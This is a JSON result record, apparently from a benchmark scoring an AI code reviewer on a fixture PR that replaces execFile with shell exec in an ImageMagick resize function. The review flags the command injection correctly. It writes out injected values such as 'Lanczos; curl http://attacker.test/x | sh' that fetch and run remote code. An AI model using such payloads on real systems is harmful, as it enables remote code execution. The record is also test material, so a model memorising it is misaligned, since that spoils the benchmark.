@@ -1,0 +1,109 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "911f2462cf58",
+  "turns": 6,
+  "tool_calls": null,
+  "seconds": 60.1,
+  "setup_seconds": 0.0,
+  "total_seconds": 60.2,
+  "usage": {
+    "in": 18102,
+    "cache_read": 163200,
+    "cache_write": 0,
+    "out": 2349,
+    "source": "cli"
+  },
+  "cost_usd": 0.099258,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "critical",
+      "body": "**Command injection:** switching from `execFile` (argv, no shell) to `exec` (shell) and embedding `src` / `filter` in the command string lets any caller-controlled value run arbitrary commands.\n\n**Failure mode:** `filter` is unquoted, so a value such as `Lanczos; curl http://attacker.test/x | sh` executes after `convert`. `src` is only double-quoted, so values containing `\"`, `` ` ``, or `$(...)` still break out. Example: `filter = \"Lanczos; id\"` runs `id` on the host.\n\n**Fix:** keep `execFile`/`spawn` with `shell: false`, pass filter as a separate argv element, and allowlist known ImageMagick filter names. The `-filter` flag does not require a shell \u2014 it is a normal CLI argument.\n\n```suggestion\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) => e ? rej(e) : res(\"/tmp/out.png\"));\n```\n\n(Also restore `import { execFile } from \"child_process\"` and validate `filter` against an allowlist before invoking.)"
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 4,
+      "severity": "info",
+      "body": "The comment claims `-filter` needs a shell for user-composed expressions. ImageMagick accepts the filter as a normal argument (`convert in.png -filter Lanczos -resize 100x out.png`); complex values still belong in a single argv slot via `execFile`, not a shell. This comment will mislead future maintainers into keeping the unsafe `exec` path."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces a critical command-injection vulnerability by replacing safe `execFile` argv invocation with shell `exec` and interpolating caller-controlled `src` and `filter` into the command string.\n\n## Narrative\n\n`resize` previously ran ImageMagick via `execFile(\"convert\", [src, \"-resize\", ...])`, which never invokes a shell and treats each argument as a literal. The PR switches to `exec(\\`convert \"${src}\" -filter ${filter} -resize ${w}x ...\\`)`.\n\nThat is exploitable in multiple ways:\n\n- **`filter` is unquoted** in the shell string. A value like `Lanczos; id` or `` $(curl attacker.test/payload) `` runs arbitrary commands on the host.\n- **`src` is only double-quoted**, which does not stop `\"`, `` ` ``, `$(...)`, or `$VAR` expansion inside the quotes on a POSIX shell.\n- The justification comment (\"-filter flag needs a shell for the user-composed filter expressions\") is incorrect: ImageMagick filter names/expressions are ordinary argv tokens and work with `execFile` / `spawn` without a shell.\n\nAny caller that passes request parameters, upload paths, or UI filter strings into `resize` hands the runner (or app server) to an attacker. Even if current in-repo callers are absent, this is an exported API surface.\n\n## Recommendation\n\nKeep `execFile` (or `spawn` with `shell: false`). Pass `filter` as its own argv element after validation against an allowlist of known ImageMagick filters (e.g. `Lanczos`, `Mitchell`, `Catrom`). Do not interpolate untrusted strings into a shell command.\n\n**Recommendation:** request-changes",
+  "round": "full",
+  "effective_max_turns": 20,
+  "budget": {
+    "tier": "standard",
+    "profile": "auto",
+    "turns": 20,
+    "tier_turns": 20,
+    "alias": "balanced",
+    "model": "grok-4.5",
+    "output_tokens": 8192,
+    "verifier_warning_pct": 30,
+    "patch_bytes": 120000,
+    "native_cap_applied": true
+  },
+  "prior_finding_updates": {},
+  "prior_findings_kept": [],
+  "outstanding_verdicts": [],
+  "verification": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The patch switches from execFile with argv to exec with a shell string that interpolates unquoted `filter` and only double-quoted `src`, enabling command injection (e.g. `Lanczos; id`). Base used safe execFile; no allowlist or escaping is present."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 4,
+      "severity_claimed": "info",
+      "status": "skipped",
+      "reason": "info is never verified"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 11.833,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 1,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 2609,
+      "out": 421
+    },
+    "cost_usd": 0.008768
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
